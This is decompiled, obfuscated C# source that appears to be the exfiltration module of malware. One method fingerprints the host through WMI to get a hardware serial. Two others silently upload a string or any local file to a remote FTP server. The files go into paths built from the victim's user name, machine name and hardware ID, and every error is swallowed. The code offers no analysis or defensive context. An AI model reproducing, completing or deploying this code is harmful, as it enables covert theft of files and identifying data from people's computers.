using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace oXSOOyVgTNm;

internal sealed class JVNsUrWNTuwEu
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string PpPaxJIRqdB()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107401860));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107401807)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107401790);
			ManagementObject val3 = new ManagementObject(getString_0(107401785) + text + getString_0(107401744));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107401771)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107389479);
		}
	}

	public static void utQznJGFYcPXpPpc(string ADBFTuOmKERl = "URL", string WQkgwxJIRcOP = "USERNAME", string kZBAMUpDPA = "ACCESO", string wXqVVzEzwrjs = "")
	{
		try
		{
			string text = PpPaxJIRqdB();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ADBFTuOmKERl + getString_0(107402746) + Environment.UserName + getString_0(107402765) + Environment.MachineName + getString_0(107402712) + text + getString_0(107402707));
			ftpWebRequest.Method = getString_0(107401714);
			ftpWebRequest.Credentials = new NetworkCredential(WQkgwxJIRcOP, kZBAMUpDPA);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(wXqVVzEzwrjs);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void zPNMeddvbcVdbRzaZ(string DluaPviBGFDkk = "URL", string SytjmtZisLNeV = "USERNAME", string ZVUwlINBFEHr = "ACCESO", string nztEXTpndNPY = "")
	{
		try
		{
			string text = PpPaxJIRqdB();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(DluaPviBGFDkk + getString_0(107402746) + Environment.UserName + getString_0(107402765) + Environment.MachineName + getString_0(107402712) + text + getString_0(107402712) + Path.GetFileName(nztEXTpndNPY));
			ftpWebRequest.Method = getString_0(107401714);
			ftpWebRequest.Credentials = new NetworkCredential(SytjmtZisLNeV, ZVUwlINBFEHr);
			byte[] array = File.ReadAllBytes(nztEXTpndNPY);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static JVNsUrWNTuwEu()
	{
		Strings.CreateGetStringDelegate(typeof(JVNsUrWNTuwEu));
	}
}
